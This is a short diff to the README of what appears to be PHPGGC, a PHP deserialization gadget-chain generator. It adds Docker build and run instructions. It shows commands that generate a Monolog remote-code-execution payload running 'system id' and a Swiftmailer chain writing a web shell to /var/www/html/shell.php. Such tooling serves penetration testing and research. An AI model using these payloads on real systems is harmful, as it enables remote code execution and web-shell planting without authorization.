@@ -77,3 +77,12 @@ $ ./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
 O:13:"Swift_Message":8:{...}
 ```
 For more check repo.
+
+## Docker
+```
+git clone https://github.com/ambionics/phpggc
+docker build . -t 'phpggc'
+docker run phpggc -l
+
+docker run phpggc Monolog/rce1 'system' 'id'
+```
